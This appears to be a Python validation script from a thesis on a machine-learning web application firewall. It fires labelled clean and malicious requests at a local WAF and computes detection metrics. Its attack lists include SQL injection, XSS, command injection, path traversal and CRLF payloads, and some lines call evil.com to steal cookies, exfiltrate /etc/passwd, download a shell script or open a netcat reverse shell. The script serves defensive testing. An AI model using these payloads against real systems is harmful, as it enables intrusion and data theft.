#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║  WAF-ML — Prueba de Validación Estadística                     ║
║                                                                ║
║  Evalúa el WAF contra ~225 casos totales (132 tráfico           ║
║  legítimo + 92 ataques) y calcula métricas con intervalo de    ║
║  confianza de Wilson para FPR.                                 ║
║                                                                ║
║  Incluye 2 fases:                                              ║
║    1. Prueba Piloto      — 31 casos originales                 ║
║    2. Validación         — ~224 casos (132 limpios + 92 atq.,  ║
║                              92 ataques con ≥10 casos/CWE,      ║
║                              priorizando SQLi/XSS con 15)       ║
║                                                                ║
║  Tesis: "WAF open source basado en ML para detección de        ║
║  ataques de inyección OWASP A05:2025 en entornos PYMES"        ║
║  USAT, Perú 2026 — Fernandez Alva, E.                          ║
╚══════════════════════════════════════════════════════════════════╝
"""

import csv, json, math, os, sys, time, statistics
from datetime import datetime
from typing import Optional

try:
    import requests
except ImportError:
    print("ERROR: pip install requests")
    sys.exit(1)


# ══════════════════════════════════════════════════════════════════
# CONFIGURACIÓN
# ══════════════════════════════════════════════════════════════════

WAF_URL = os.getenv("WAF_URL", "http://localhost:80")
OUTPUT_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "results")

# Umbrales WAF-ML
THRESHOLD_LOG = 0.30
THRESHOLD_BLOCK = 0.70


# ══════════════════════════════════════════════════════════════════
# UTILIDADES
# ══════════════════════════════════════════════════════════════════

def send_request(method: str, path: str,
                 params: Optional[dict] = None,
                 data: Optional[dict] = None,
                 json_body: Optional[dict] = None,
                 headers: Optional[dict] = None) -> tuple[int, Optional[str], Optional[float], Optional[str]]:
    """Envía un request al WAF y retorna (status, waf_action, waf_score, error)."""
    url = f"{WAF_URL}{path}"
    hdrs = {"Accept": "application/json"}
    if headers:
        hdrs.update(headers)
    if json_body:
        hdrs.setdefault("Content-Type", "application/json")

    start = time.time()
    error = None
    try:
        if json_body:
            r = requests.request(method, url, params=params, json=json_body,
                                 headers=hdrs, timeout=8, allow_redirects=False)
        else:
            r = requests.request(method, url, params=params, data=data,
                                 headers=hdrs, timeout=8, allow_redirects=False)
        status = r.status_code
        waf_action = r.headers.get("X-WAF-Action")
        raw_score = r.headers.get("X-WAF-Score")
        waf_score = float(raw_score) if raw_score else None
    except requests.exceptions.ConnectionError:
        status, waf_action, waf_score = 502, None, None
        error = "Connection refused"
    except requests.exceptions.Timeout:
        status, waf_action, waf_score = 504, None, None
        error = "Timeout"
    except Exception as e:
        status, waf_action, waf_score = 599, None, None
        error = str(e)

    elapsed = round((time.time() - start) * 1000, 2)
    return status, waf_action, waf_score, error


def classify(expected: str, status: int, waf_action: Optional[str]) -> str:
    """Clasifica resultado: TP, TN, FP, FN."""
    blocked = status == 403
    logged = waf_action == "LOG"
    expects_block = expected == "BLOCK"

    if expects_block:
        if blocked or logged:
            return "TP"
        return "FN"
    else:  # ALLOW
        if not blocked and not logged:
            return "TN"
        return "FP"


# ══════════════════════════════════════════════════════════════════
# INTERVALO DE CONFIANZA DE WILSON
# ══════════════════════════════════════════════════════════════════

def wilson_ci(k: int, n: int, z: float = 1.96) -> tuple[float, float, float]:
    """
    Intervalo de confianza de Wilson para una proporción binomial.

    Fórmula de Wilson (1927):
      centre = (k + z²/2) / (n + z²)
      margin = z√n / (n + z²) · √[p̂(1-p̂) + z²/(4n)]

    Retorna (lower, centre, upper) como proporciones en [0, 1].
    """
    if n == 0:
        return (0.0, 0.0, 0.0)
    p = k / n
    denom = 1 + z**2 / n
    centre = (p + z**2 / (2 * n)) / denom
    margin = (z * math.sqrt(p * (1 - p) / n + z**2 / (4 * n**2))) / denom
    return (max(0.0, centre - margin), centre, min(1.0, centre + margin))


# ══════════════════════════════════════════════════════════════════
# FASE 1: PRUEBA PILOTO — 31 casos originales
# ══════════════════════════════════════════════════════════════════

PILOT_ATTACKS = [
    # SQLi — CWE-89 (8)
    ("SQLi_login_OR",        "POST", "/api/v1/auth/login",       None, {"email": "' OR '1'='1", "password": "x"}),
    ("SQLi_login_DROP",      "POST", "/api/v1/auth/login",       None, {"email": "'; DROP TABLE users;--", "password": "x"}),
    ("SQLi_login_UNION",     "POST", "/api/v1/auth/login",       None, {"email": "' UNION SELECT null,email,password FROM users--", "password": "x"}),
    ("SQLi_login_admin",     "POST", "/api/v1/auth/login",       None, {"email": "admin'--", "password": "x"}),
    ("SQLi_clients_filter",  "GET",  "/api/v1/clients",          {"search": "' OR 1=1--"}, None),
    ("SQLi_products_filter", "GET",  "/api/v1/products",         {"search": "' OR '1'='1"}, None),
    ("SQLi_persons_find",    "GET",  "/api/v1/persons/find",     {"document": "' OR 1=1--"}, None),
    ("SQLi_suppliers",       "GET",  "/api/v1/suppliers",        {"search": "1; SELECT * FROM users--"}, None),
    # SQLi ORM — CWE-564 (4)
    ("SQLi_ORM_hex",         "POST", "/api/v1/auth/login",       None, {"email": "0x61646d696e2740", "password": "x"}),
    ("SQLi_ORM_comment",     "GET",  "/api/v1/clients",          {"search": "' OR/**/1=1--"}, None),
    ("SQLi_ORM_encode",      "GET",  "/api/v1/products",         {"search": "%27%20OR%20%271%27%3D%271"}, None),
    ("SQLi_ORM_tautology",   "POST", "/api/v1/auth/login",       None, {"email": "' OR 'x'='x", "password": "x"}),
    # XSS Reflected — CWE-79 (5)
    ("XSS_script_tag",       "GET",  "/api/v1/clients",          {"search": "<script>alert('xss')</script>"}, None),
    ("XSS_img_onerror",      "GET",  "/api/v1/products",         {"search": "<img src=x onerror=alert(1)>"}, None),
    ("XSS_javascript_uri",   "GET",  "/api/v1/clients",          {"search": "javascript:alert(document.cookie)"}, None),
    ("XSS_iframe",           "GET",  "/api/v1/suppliers",        {"search": "<iframe src='javascript:alert(1)'>"}, None),
    ("XSS_svg",              "GET",  "/api/v1/products",         {"search": "<svg onload=alert(1)>"}, None),
    # XSS Basic — CWE-80 (3)
    ("XSS_basic_script",     "GET",  "/api/v1/inventories",      {"search": "<script>document.location='http://evil.com?c='+document.cookie</script>"}, None),
    ("XSS_basic_body",       "POST", "/api/v1/clients",          None, {"name": "<script>alert(1)</script>", "email": "test@test.com"}),
    ("XSS_basic_brands",     "GET",  "/api/v1/brands",           {"search": "<script>alert('XSS')</script>"}, None),
    # XSS Atributo — CWE-83 (4)
    ("XSS_attr_onerror",     "GET",  "/api/v1/products",         {"search": "\" onerror=\"alert(1)\""}, None),
    ("XSS_attr_onmouseover", "GET",  "/api/v1/clients",          {"search": "x\" onmouseover=\"alert(1)\""}, None),
    ("XSS_attr_style",       "POST", "/api/v1/clients",          None, {"name": "x\" style=\"background:url(javascript:alert(1))\""}),
    ("XSS_attr_href",        "GET",  "/api/v1/suppliers",        {"search": "\" href=\"javascript:void(0)\" onclick=\"alert(1)\""}, None),
    # Command Injection — CWE-77 (4)
    ("CMD_pipe",             "GET",  "/api/v1/persons/find",     {"document": "12345678 | ls -la"}, None),
    ("CMD_semicolon",        "GET",  "/api/v1/persons/find",     {"document": "12345678; cat /etc/passwd"}, None),
    ("CMD_backtick",         "GET",  "/api/v1/clients",          {"search": "`id`"}, None),
    ("CMD_subshell",         "POST", "/api/v1/auth/login",       None, {"email": "$(whoami)@test.com", "password": "x"}),
    # OS Command — CWE-78 (4)
    ("OS_upload_file",       "POST", "/api/v1/repository/upload-file", None, {"filename": "../../etc/passwd; ls"}),
    ("OS_path_traversal",    "GET",  "/api/v1/repository/getForClient/1", {"path": "../../../../etc/passwd"}, None),
    ("OS_exec_php",          "POST", "/api/v1/auth/login",       None, {"email": "test@test.com; phpinfo()", "password": "x"}),
    ("OS_shell_exec",        "GET",  "/api/v1/products",         {"search": "'; exec xp_cmdshell('dir')--"}, None),
    # CRLF Injection — CWE-93 (4)
    ("CRLF_header_inject",   "GET",  "/api/v1/clients",          {"search": "test%0d%0aX-Injected: malicious"}, None),
    ("CRLF_redirect",        "GET",  "/api/v1/products",         {"search": "test\r\nLocation: http://evil.com"}, None),
    ("CRLF_cookie",          "POST", "/api/v1/auth/login",       None, {"email": "test@t.com\r\nSet-Cookie: session=hacked", "password": "x"}),
    ("CRLF_split",           "GET",  "/api/v1/suppliers",        {"search": "x%0d%0a%0d%0a<script>alert(1)</script>"}, None),
]

PILOT_CLEAN = [
    ("CLEAN_login_normal",   "POST", "/api/v1/auth/login",       None, {"email": "admin@atel.com", "password": "password123"}),
    ("CLEAN_products_list",  "GET",  "/api/v1/products",         None, None),
    ("CLEAN_clients_list",   "GET",  "/api/v1/clients",          None, None),
    ("CLEAN_brands_list",    "GET",  "/api/v1/brands",           None, None),
    ("CLEAN_categories",     "GET",  "/api/v1/categories",       None, None),
    ("CLEAN_search_normal",  "GET",  "/api/v1/products",         {"search": "laptop"}, None),
    ("CLEAN_search_number",  "GET",  "/api/v1/clients",          {"search": "12345678"}, None),
    ("CLEAN_persons_find",   "GET",  "/api/v1/persons/find",     {"document": "42345678"}, None),
    ("CLEAN_warehouses",     "GET",  "/api/v1/warehouses",       None, None),
    ("CLEAN_suppliers",      "GET",  "/api/v1/suppliers",        None, None),
]


# ══════════════════════════════════════════════════════════════════
# FASE 2: PRUEBA DE VALIDACIÓN ESTADÍSTICA — 100+ casos
# ══════════════════════════════════════════════════════════════════

# ── Tráfico limpio generado programáticamente ─────────────────────

# Productos de búsqueda legítima
PRODUCT_NAMES = [
    "laptop", "notebook", "mouse", "keyboard", "monitor", "chair", "desk",
    "cable", "adapter", "battery", "charger", "phone", "tablet", "case",
    "headset", "speaker", "webcam", "printer", "scanner", "paper",
    "toner", "cable usb", "mouse pad", "hub usb", "ssd 256",
    "memoria ram", "disco duro", "memoria usb", "audifonos", "cargador",
    "teclado", "parlantes", "mesa", "silla", "escritorio", "oficina",
    "computadora", "servidor", "rack", "switch", "router",
    "licencia office", "antivirus", "vpn",
]

# Apellidos legítimos para búsqueda de clientes
CLIENT_TERMS = [
    "Garcia", "Lopez", "Martinez", "Rodriguez", "Fernandez",
    "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres",
    "Flores", "Rivera", "Castillo", "Reyes", "Gomez",
    "Diaz", "Vargas", "Romero", "Santos", "Morales",
    "Alvarez", "Romero", "Ortiz", "Silva", "Mendoza",
    "Castro", "Gutierrez", "Vega", "Cruz", "Rojas",
]

# Documentos de identidad legítimos
DOCUMENTS = [f"{i:08d}" for i in range(10000001, 10000031)]

# Marcas legítimas
BRAND_NAMES = [
    "Sony", "Samsung", "LG", "HP", "Dell", "Lenovo", "Apple",
    "Microsoft", "Logitech", "Kingston", "Seagate", "Epson",
    "Canon", "Xerox", "Brother", "Cisco", "TP-Link", "Ubiquiti",
]

# Categorías 
CATEGORIES = [
    "electronica", "computacion", "oficina", "impresion",
    "redes", "seguridad", "software", "accesorios",
]

# Proveedores
SUPPLIER_TERMS = [
    "Grupo Atel", "Distribuidora Nacional", "Comercial ABC",
    "Importaciones XYZ", "Logistica Total", "Suministros SA",
]

# Inventarios
INVENTORY_TERMS = [
    "disponible", "stock", "agotado", "bajo stock", "en transito",
    "por vencer", "en garantia", "revisar", "activo", "inactivo",
]

# Datos de contacto legítimos
CONTACT_NAMES = [
    "Juan Perez", "Maria Garcia", "Carlos Lopez", "Ana Rodriguez",
    "Pedro Martinez", "Laura Fernandez", "Diego Gonzalez",
]

CONTACT_MESSAGES = [
    "Consulta sobre factura", "Solicito cotizacion de 10 laptops",
    "Cambio de direccion", "Reporte de entrega pendiente",
    "Solicitud de credito", "Informacion de garantia",
    "Problema con factura 12345", "Renovacion de contrato",
]


# ── Ataques ampliados por CWE para Fase 2 (92 casos) ──────────────
# Diseño: cada categoría tiene un mínimo de 10 casos (15 para SQLi/XSS
# por ser las más críticas en PYME) variando técnica de evasión
# (encoding, comentarios, mayúsculas, doble encoding, whitespace)
# para que el recall por categoría no dependa de 1-2 casos aislados.
# Formato: (cwe, desc, method, path, params, data)

VALIDATION_ATTACKS_EXPANDED = [
    # ════════════ CWE-89 — SQL Injection (15) ════════════
    ("CWE-89", "SQLi_login_or_classic",     "POST", "/api/v1/auth/login",   None, {"email": "' OR '1'='1", "password": "x"}),
    ("CWE-89", "SQLi_login_drop_table",     "POST", "/api/v1/auth/login",   None, {"email": "'; DROP TABLE users;--", "password": "x"}),
    ("CWE-89", "SQLi_login_union_select",   "POST", "/api/v1/auth/login",   None, {"email": "' UNION SELECT null,email,password FROM users--", "password": "x"}),
    ("CWE-89", "SQLi_login_admin_comment",  "POST", "/api/v1/auth/login",   None, {"email": "admin'--", "password": "x"}),
    ("CWE-89", "SQLi_login_uppercase",      "POST", "/api/v1/auth/login",   None, {"email": "' OR 1=1 OR 'a'='a", "password": "x"}),
    ("CWE-89", "SQLi_clients_or_1eq1",      "GET",  "/api/v1/clients",      {"search": "' OR 1=1--"}, None),
    ("CWE-89", "SQLi_clients_stacked",      "GET",  "/api/v1/clients",      {"search": "1'; SELECT pg_sleep(5)--"}, None),
    ("CWE-89", "SQLi_products_tautology",   "GET",  "/api/v1/products",     {"search": "' OR '1'='1"}, None),
    ("CWE-89", "SQLi_products_union_v2",    "GET",  "/api/v1/products",     {"search": "' UNION SELECT username,password,3 FROM admins--"}, None),
    ("CWE-89", "SQLi_persons_or_1eq1",      "GET",  "/api/v1/persons/find", {"document": "' OR 1=1--"}, None),
    ("CWE-89", "SQLi_persons_boolean",      "GET",  "/api/v1/persons/find", {"document": "1' AND '1'='1"}, None),
    ("CWE-89", "SQLi_suppliers_stacked",    "GET",  "/api/v1/suppliers",    {"search": "1; SELECT * FROM users--"}, None),
    ("CWE-89", "SQLi_suppliers_blind_time", "GET",  "/api/v1/suppliers",    {"search": "1' AND SLEEP(5)--"}, None),
    ("CWE-89", "SQLi_brands_having",        "GET",  "/api/v1/brands",       {"search": "' GROUP BY id HAVING 1=1--"}, None),
    ("CWE-89", "SQLi_categories_order_by",  "GET",  "/api/v1/categories",   {"search": "' ORDER BY 10--"}, None),

    # ════════════ CWE-564 — SQL Injection (Hibernate/ORM) (10) ════════════
    ("CWE-564", "SQLi_ORM_hex_encode",       "POST", "/api/v1/auth/login", None, {"email": "0x61646d696e2740", "password": "x"}),
    ("CWE-564", "SQLi_ORM_inline_comment",   "GET",  "/api/v1/clients",    {"search": "' OR/**/1=1--"}, None),
    ("CWE-564", "SQLi_ORM_url_encoded",      "GET",  "/api/v1/products",   {"search": "%27%20OR%20%271%27%3D%271"}, None),
    ("CWE-564", "SQLi_ORM_tautology_alt",    "POST", "/api/v1/auth/login", None, {"email": "' OR 'x'='x", "password": "x"}),
    ("CWE-564", "SQLi_ORM_double_encoded",   "GET",  "/api/v1/clients",    {"search": "%2527%2520OR%25201%253D1"}, None),
    ("CWE-564", "SQLi_ORM_concat_function",  "GET",  "/api/v1/products",   {"search": "' || (SELECT password FROM users LIMIT 1) || '"}, None),
    ("CWE-564", "SQLi_ORM_hql_injection",    "GET",  "/api/v1/clients",    {"search": "' or 1=1 or ''='"}, None),
    ("CWE-564", "SQLi_ORM_nested_select",    "GET",  "/api/v1/suppliers", {"search": "' AND (SELECT 1 FROM users WHERE username='admin')--"}, None),
    ("CWE-564", "SQLi_ORM_cast_bypass",      "GET",  "/api/v1/products",   {"search": "' AND CAST(1 AS INT)=1--"}, None),
    ("CWE-564", "SQLi_ORM_mixed_case",       "POST", "/api/v1/auth/login", None, {"email": "' uNiOn SeLeCt null,null--", "password": "x"}),

    # ════════════ CWE-79 — XSS Reflejado (15) ════════════
    ("CWE-79", "XSS_script_tag_basic",       "GET",  "/api/v1/clients",     {"search": "<script>alert('xss')</script>"}, None),
    ("CWE-79", "XSS_img_onerror",            "GET",  "/api/v1/products",    {"search": "<img src=x onerror=alert(1)>"}, None),
    ("CWE-79", "XSS_javascript_uri",         "GET",  "/api/v1/clients",     {"search": "javascript:alert(document.cookie)"}, None),
    ("CWE-79", "XSS_iframe_inject",          "GET",  "/api/v1/suppliers",   {"search": "<iframe src='javascript:alert(1)'>"}, None),
    ("CWE-79", "XSS_svg_onload",             "GET",  "/api/v1/products",    {"search": "<svg onload=alert(1)>"}, None),
    ("CWE-79", "XSS_body_onload",            "GET",  "/api/v1/clients",     {"search": "<body onload=alert(1)>"}, None),
    ("CWE-79", "XSS_input_autofocus",        "GET",  "/api/v1/products",    {"search": "<input autofocus onfocus=alert(1)>"}, None),
    ("CWE-79", "XSS_uppercase_script",       "GET",  "/api/v1/clients",     {"search": "<SCRIPT>alert(1)</SCRIPT>"}, None),
    ("CWE-79", "XSS_html_entity_encoded",    "GET",  "/api/v1/products",    {"search": "&#60;script&#62;alert(1)&#60;/script&#62;"}, None),
    ("CWE-79", "XSS_url_encoded_script",     "GET",  "/api/v1/clients",     {"search": "%3Cscript%3Ealert(1)%3C%2Fscript%3E"}, None),
    ("CWE-79", "XSS_detail_event",           "GET",  "/api/v1/suppliers",   {"search": "<details open ontoggle=alert(1)>"}, None),
    ("CWE-79", "XSS_marquee_event",          "GET",  "/api/v1/products",    {"search": "<marquee onstart=alert(1)>"}, None),
    ("CWE-79", "XSS_video_onerror",          "GET",  "/api/v1/clients",     {"search": "<video src=x onerror=alert(1)>"}, None),
    ("CWE-79", "XSS_post_body_field",        "POST", "/api/v1/clients",     None, {"name": "<script>fetch('http://evil.com?c='+document.cookie)</script>", "email": "x@x.com"}),
    ("CWE-79", "XSS_object_data",            "GET",  "/api/v1/suppliers",   {"search": "<object data=javascript:alert(1)>"}, None),

    # ════════════ CWE-80 — XSS Básico/Reflejado (10) ════════════
    ("CWE-80", "XSS_basic_exfil_cookie",     "GET",  "/api/v1/inventories", {"search": "<script>document.location='http://evil.com?c='+document.cookie</script>"}, None),
    ("CWE-80", "XSS_basic_body_field",       "POST", "/api/v1/clients",     None, {"name": "<script>alert(1)</script>", "email": "test@test.com"}),
    ("CWE-80", "XSS_basic_brands_field",     "GET",  "/api/v1/brands",      {"search": "<script>alert('XSS')</script>"}, None),
    ("CWE-80", "XSS_basic_categories",       "GET",  "/api/v1/categories",  {"search": "<script>alert(document.domain)</script>"}, None),
    ("CWE-80", "XSS_basic_warehouses",       "GET",  "/api/v1/warehouses",  {"search": "<script>alert(1)</script>"}, None),
    ("CWE-80", "XSS_basic_no_quotes",        "GET",  "/api/v1/products",    {"search": "<script>alert(String.fromCharCode(88,83,83))</script>"}, None),
    ("CWE-80", "XSS_basic_lowercase_tag",    "GET",  "/api/v1/clients",     {"search": "<script src=//evil.com/x.js></script>"}, None),
    ("CWE-80", "XSS_basic_contact_msg",      "POST", "/api/v1/contact",     None, {"name": "Juan", "email": "j@test.com", "message": "<script>alert(1)</script>"}),
    ("CWE-80", "XSS_basic_persons_doc",      "GET",  "/api/v1/persons/find", {"document": "<script>alert(1)</script>"}, None),
    ("CWE-80", "XSS_basic_double_tag",       "GET",  "/api/v1/products",    {"search": "<scr<script>ipt>alert(1)</scr</script>ipt>"}, None),

    # ════════════ CWE-83 — XSS en Atributo (10) ════════════
    ("CWE-83", "XSS_attr_onerror_quote",     "GET",  "/api/v1/products",    {"search": "\" onerror=\"alert(1)\""}, None),
    ("CWE-83", "XSS_attr_onmouseover",       "GET",  "/api/v1/clients",     {"search": "x\" onmouseover=\"alert(1)\""}, None),
    ("CWE-83", "XSS_attr_style_url",         "POST", "/api/v1/clients",     None, {"name": "x\" style=\"background:url(javascript:alert(1))\""}),
    ("CWE-83", "XSS_attr_href_onclick",      "GET",  "/api/v1/suppliers",   {"search": "\" href=\"javascript:void(0)\" onclick=\"alert(1)\""}, None),
    ("CWE-83", "XSS_attr_single_quote",      "GET",  "/api/v1/products",    {"search": "' onfocus='alert(1)' autofocus='"}, None),
    ("CWE-83", "XSS_attr_close_tag",         "GET",  "/api/v1/clients",     {"search": "\"><script>alert(1)</script>"}, None),
    ("CWE-83", "XSS_attr_data_uri",          "GET",  "/api/v1/products",    {"search": "\" src=\"data:text/html,<script>alert(1)</script>\""}, None),
    ("CWE-83", "XSS_attr_formaction",        "GET",  "/api/v1/suppliers",   {"search": "\" formaction=\"javascript:alert(1)"}, None),
    ("CWE-83", "XSS_attr_value_break",       "POST", "/api/v1/clients",     None, {"name": "test\" value=\"x\" onfocus=\"alert(1)"}),
    ("CWE-83", "XSS_attr_backtick",          "GET",  "/api/v1/products",    {"search": "`onmouseover=alert(1)`"}, None),

    # ════════════ CWE-77 — Command Injection genérico (10) ════════════
    ("CWE-77", "CMD_pipe_ls",                "GET",  "/api/v1/persons/find", {"document": "12345678 | ls -la"}, None),
    ("CWE-77", "CMD_semicolon_passwd",        "GET",  "/api/v1/persons/find", {"document": "12345678; cat /etc/passwd"}, None),
    ("CWE-77", "CMD_backtick_id",             "GET",  "/api/v1/clients",      {"search": "`id`"}, None),
    ("CWE-77", "CMD_subshell_whoami",         "POST", "/api/v1/auth/login",   None, {"email": "$(whoami)@test.com", "password": "x"}),
    ("CWE-77", "CMD_double_pipe",             "GET",  "/api/v1/persons/find", {"document": "12345678 || whoami"}, None),
    ("CWE-77", "CMD_and_operator",            "GET",  "/api/v1/clients",      {"search": "test && cat /etc/shadow"}, None),
    ("CWE-77", "CMD_newline_inject",          "GET",  "/api/v1/persons/find", {"document": "12345678\nid"}, None),
    ("CWE-77", "CMD_subshell_uname",          "GET",  "/api/v1/suppliers",    {"search": "$(uname -a)"}, None),
    ("CWE-77", "CMD_powershell_style",        "POST", "/api/v1/auth/login",   None, {"email": "test; Get-Process@test.com", "password": "x"}),
    ("CWE-77", "CMD_env_var_leak",            "GET",  "/api/v1/products",     {"search": "$PATH; env"}, None),

    # ════════════ CWE-78 — OS Command Injection (12) ════════════
    ("CWE-78", "OS_upload_path_traversal",   "POST", "/api/v1/repository/upload-file",     None, {"filename": "../../etc/passwd; ls"}),
    ("CWE-78", "OS_path_traversal_deep",     "GET",  "/api/v1/repository/getForClient/1",  {"path": "../../../../etc/passwd"}, None),
    ("CWE-78", "OS_exec_php_func",           "POST", "/api/v1/auth/login",                 None, {"email": "test@test.com; phpinfo()", "password": "x"}),
    ("CWE-78", "OS_xp_cmdshell",             "GET",  "/api/v1/products",                   {"search": "'; exec xp_cmdshell('dir')--"}, None),
    ("CWE-78", "OS_windows_traversal",       "GET",  "/api/v1/repository/getForClient/1",  {"path": "..\\..\\..\\windows\\win.ini"}, None),
    ("CWE-78", "OS_null_byte_bypass",        "GET",  "/api/v1/repository/getForClient/1",  {"path": "../../etc/passwd%00.jpg"}, None),
    ("CWE-78", "OS_double_url_encode",       "GET",  "/api/v1/repository/getForClient/1",  {"path": "%252e%252e%252fetc%252fpasswd"}, None),
    ("CWE-78", "OS_upload_double_ext",       "POST", "/api/v1/repository/upload-file",     None, {"filename": "shell.php.jpg; rm -rf /"}),
    ("CWE-78", "OS_curl_exfil",              "GET",  "/api/v1/clients",                    {"search": "; curl http://evil.com/$(cat /etc/passwd)"}, None),
    ("CWE-78", "OS_wget_download",           "GET",  "/api/v1/suppliers",                  {"search": "; wget http://evil.com/shell.sh -O /tmp/s.sh"}, None),
    ("CWE-78", "OS_nc_reverse_shell",        "GET",  "/api/v1/products",                   {"search": "; nc -e /bin/sh evil.com 4444"}, None),
    ("CWE-78", "OS_base64_decode_exec",      "POST", "/api/v1/auth/login",                 None, {"email": "x; echo cm0gLXJmIC8= | base64 -d | sh", "password": "x"}),

    # ════════════ CWE-93 — CRLF Injection (10) ════════════
    ("CWE-93", "CRLF_header_inject_encoded", "GET",  "/api/v1/clients",   {"search": "test%0d%0aX-Injected: malicious"}, None),
    ("CWE-93", "CRLF_redirect_raw",          "GET",  "/api/v1/products",  {"search": "test\r\nLocation: http://evil.com"}, None),
    ("CWE-93", "CRLF_cookie_inject",         "POST", "/api/v1/auth/login", None, {"email": "test@t.com\r\nSet-Cookie: session=hacked", "password": "x"}),
    ("CWE-93", "CRLF_double_split_xss",      "GET",  "/api/v1/suppliers", {"search": "x%0d%0a%0d%0a<script>alert(1)</script>"}, None),
    ("CWE-93", "CRLF_lowercase_encoded",     "GET",  "/api/v1/clients",   {"search": "test%0D%0AX-Forwarded-For: 127.0.0.1"}, None),
    ("CWE-93", "CRLF_http_response_split",   "GET",  "/api/v1/products",  {"search": "a%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK"}, None),
    ("CWE-93", "CRLF_log_injection",         "POST", "/api/v1/auth/login", None, {"email": "admin\r\n[FAKE] login success", "password": "x"}),
    ("CWE-93", "CRLF_cache_poison",          "GET",  "/api/v1/clients",   {"search": "test%0d%0aX-Cache-Control: no-cache"}, None),
    ("CWE-93", "CRLF_unicode_variant",       "GET",  "/api/v1/suppliers", {"search": "test%E5%98%8A%E5%98%8DSet-Cookie:%20x=1"}, None),
    ("CWE-93", "CRLF_partial_encoded",       "GET",  "/api/v1/products",  {"search": "test\r%0aX-Injected: yes"}, None),
]


def build_validation_cases() -> list[dict]:
    """Construye todos los casos de validación (80+ clean + 92 attack)."""
    cases = []

    # ── 1. Búsquedas de productos (40 casos) ──────────────────
    for name in PRODUCT_NAMES:
        cases.append({
            "id": f"VAL_SRCH_{len(cases)+1:03d}",
            "cwe": "CLEAN",
            "desc": f"Buscar producto: '{name}'",
            "method": "GET",
            "path": "/api/v1/products",
            "params": {"search": name},
            "data": None, "json": None, "headers": None,
            "expected": "ALLOW",
        })

    # ── 2. Búsquedas de clientes por apellido (30 casos) ──────
    for term in CLIENT_TERMS:
        cases.append({
            "id": f"VAL_CLI_{len(cases)+1:03d}",
            "cwe": "CLEAN",
            "desc": f"Buscar cliente: '{term}'",
            "method": "GET",
            "path": "/api/v1/clients",
            "params": {"search": term},
            "data": None, "json": None, "headers": None,
            "expected": "ALLOW",
        })

    # ── 3. Búsqueda de personas por documento (10 casos) ──────
    for doc in DOCUMENTS[:10]:
        cases.append({
            "id": f"VAL_DOC_{len(cases)+1:03d}",
            "cwe": "CLEAN",
            "desc": f"Buscar persona DNI: {doc}",
            "method": "GET",
            "path": "/api/v1/persons/find",
            "params": {"document": doc},
            "data": None, "json": None, "headers": None,
            "expected": "ALLOW",
        })

    # ── 4. Marcas listado/búsqueda (8 casos) ──────────────────
    for brand in BRAND_NAMES[:8]:
        cases.append({
            "id": f"VAL_BR_{len(cases)+1:03d}",
            "cwe": "CLEAN",
            "desc": f"Buscar marca: '{brand}'",
            "method": "GET",
            "path": "/api/v1/brands",
            "params": {"search": brand},
            "data": None, "json": None, "headers": None,
            "expected": "ALLOW",
        })

    # ── 5. Categorías (4 casos) ───────────────────────────────
    for cat in CATEGORIES[:4]:
        cases.append({
            "id": f"VAL_CAT_{len(cases)+1:03d}",
            "cwe": "CLEAN",
            "desc": f"Categoría: '{cat}'",
            "method": "GET",
            "path": "/api/v1/categories",
            "params": {"search": cat},
            "data": None, "json": None, "headers": None,
            "expected": "ALLOW",
        })

    # ── 6. Proveedores (6 casos) ──────────────────────────────
    for sup in SUPPLIER_TERMS:
        cases.append({
            "id": f"VAL_SUP_{len(cases)+1:03d}",
            "cwe": "CLEAN",
            "desc": f"Buscar proveedor: '{sup}'",
            "method": "GET",
            "path": "/api/v1/suppliers",
            "params": {"search": sup},
            "data": None, "json": None, "headers": None,
            "expected": "ALLOW",
        })

    # ── 7. Inventarios (5 casos) ──────────────────────────────
    for term in INVENTORY_TERMS[:5]:
        cases.append({
            "id": f"VAL_INV_{len(cases)+1:03d}",
            "cwe": "CLEAN",
            "desc": f"Inventario: '{term}'",
            "method": "GET",
            "path": "/api/v1/inventories",
            "params": {"search": term},
            "data": None, "json": None, "headers": None,
            "expected": "ALLOW",
        })

    # ── 8. Alamacenes (3 casos) ────────────────────────────────
    for wid in [1, 2, 3]:
        cases.append({
            "id": f"VAL_WH_{len(cases)+1:03d}",
            "cwe": "CLEAN",
            "desc": f"Almacén ID={wid}",
            "method": "GET",
            "path": "/api/v1/warehouses",
            "params": {"id": str(wid)},
            "data": None, "json": None, "headers": None,
            "expected": "ALLOW",
        })

    # ── 9. Paginación (6 casos) ────────────────────────────────
    for page, limit in [(1, 10), (2, 10), (1, 25), (2, 25), (1, 50), (3, 10)]:
        cases.append({
            "id": f"VAL_PAG_{len(cases)+1:03d}",
            "cwe": "CLEAN",
            "desc": f"Paginación page={page} limit={limit}",
            "method": "GET",
            "path": "/api/v1/products",
            "params": {"page": str(page), "limit": str(limit)},
            "data": None, "json": None, "headers": None,
            "expected": "ALLOW",
        })

    # ── 10. POST login con credenciales realistas (5 casos) ───
    for email, pw in [
        ("admin@atel.com", "password123"),
        ("user@test.com", "pass1234"),
        ("ventas@atel.com", "Ventas2026!"),
        ("soporte@atel.com", "S0p0rt3#"),
        ("compras@atel.com", "Compras.2026"),
    ]:
        cases.append({
            "id": f"VAL_LOG_{len(cases)+1:03d}",
            "cwe": "CLEAN",
            "desc": f"POST login: {email}",
            "method": "POST",
            "path": "/api/v1/auth/login",
            "params": None,
            "data": {"email": email, "password": pw},
            "json": None, "headers": None,
            "expected": "ALLOW",
        })

    # ── 11. Login con JSON body (3 casos) ─────────────────────
    cases.append({
        "id": f"VAL_JSON_{len(cases)+1:03d}",
        "cwe": "CLEAN",
        "desc": "POST login JSON body",
        "method": "POST",
        "path": "/api/v1/auth/login",
        "params": None, "data": None,
        "json": {"email": "admin@atel.com", "password": "test123"},
        "headers": None, "expected": "ALLOW",
    })
    cases.append({
        "id": f"VAL_JSON_{len(cases)+1:03d}",
        "cwe": "CLEAN",
        "desc": "POST contacto JSON",
        "method": "POST",
        "path": "/api/v1/contact",
        "params": None, "data": None,
        "json": {"name": "Juan", "email": "juan@test.com", "message": "Consulta de precios"},
        "headers": None, "expected": "ALLOW",
    })
    cases.append({
        "id": f"VAL_JSON_{len(cases)+1:03d}",
        "cwe": "CLEAN",
        "desc": "POST client JSON create",
        "method": "POST",
        "path": "/api/v1/clients",
        "params": None, "data": None,
        "json": {"name": "Empresa SAC", "email": "contacto@empresa.com"},
